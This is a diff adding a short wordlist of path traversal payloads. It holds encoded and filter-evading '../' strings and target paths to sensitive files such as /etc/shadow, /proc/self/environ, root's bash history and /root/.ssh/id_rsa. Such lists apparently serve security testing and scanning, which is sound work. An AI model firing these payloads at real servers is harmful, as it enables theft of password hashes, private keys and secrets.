@@ -1,0 +1,23 @@
+# Path Traversal Payloads
+../../../etc/passwd
+..%2F..%2F..%2Fetc%2Fpasswd
+/etc/passwd
+/etc/shadow
+/etc/issue
+/etc/group
+/etc/hosts
+/etc/motd
+/proc/self/environ
+/proc/self/cmdline
+/proc/self/stat
+/proc/self/status
+../../../../../../etc/passwd
+....//....//....//etc/passwd
+..///////..////..//////etc/passwd
+/var/log/auth.log
+/var/log/secure
+/var/log/messages
+/var/log/syslog
+/root/.bash_history
+/root/.ssh/id_rsa
+/home/user/.bash_history
